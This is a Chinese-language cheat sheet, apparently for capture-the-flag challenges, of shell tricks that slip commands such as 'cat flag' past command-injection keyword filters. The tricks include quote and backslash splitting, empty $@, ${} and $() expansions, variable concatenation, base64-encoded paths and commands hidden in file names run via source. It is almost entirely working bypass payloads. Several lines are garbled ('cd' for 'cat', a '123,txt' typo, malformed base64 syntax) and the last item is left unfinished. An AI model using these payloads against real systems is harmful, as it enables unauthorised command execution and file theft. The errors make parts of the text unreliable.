单双引号切割:通过用引号包裹命令或者参数来绕过匹配
    cat 1'2'3.txt-->cd 123.txt(对数字也是同样的效果)
    c"a"t flag-->cat flag
反斜杠\切割:通过在命令或参数间穿插反斜杠来绕过匹配
(反斜杠会对字符转义,但普通字符不变)
    cat 1\23.txt-->cd 123.txt
    c\at flag-->cat flag
''/$@绕过:linux当中''和$@都能被当作空字符串,放在字符串中间会被直接拼接
    cat fl''/$@ag.txt-->cat flag.txt
     ca''/$@t flag.txt-->cat flag.txt
$''内部转义切割:将命令或参数拆解一部分放入绕过匹配
($''会对内部内容转义,但普通字符不变)
    cat 1$'2'3.txt-->cd 123.txt
    c$'a't flag-->cat flag
$""内部翻译切割:和内部转义切割一样
    cat 1$"2"3.txt-->cd 123.txt
    c$"a"t flag-->cat flag
x=a;${x}变量替换切割:通过把命令或参数用变量拼接来绕过检测
    x=a;c${x}t 123.txt-->cat 123.txt
    x=123;cat ${x}.txt-->cat 123.txt
${}未定义变量绕过:${}和${未定义变量}会被当成空字符串,直接放在字符串中间绕过检测
    ca${}t 123.txt-->cat 123.txt
    cat 12${123}3.txt-->cat 123.txt
命令替换绕过:$()与``内部不写内容或命令执行返回空时,用在字符串之间匹配绕过
    ca$()t 123.txt-->cat 123.txt
    cat 12``3.txt-->cat 123.txt
    ca`echo`t 123.txt-->cat 123.txt
    echo后面没内容,打印空返回,不影响外层命令
base64嵌套编码绕过:将目录编码绕过检测,嵌套解码后读取
    cat `(/flag base64编码)|base64 -d`
    cat $((/flag base64编码)|base64 -d)
文件名设置命令执行:将文件名写入某一文件内,后用source或者.读取文件执行命令
1.  touch "cat flag.txt"
    ls "cat flag.txt">123.txt
    source ./123,txt
2.(防止对文件名检测,分开写入)
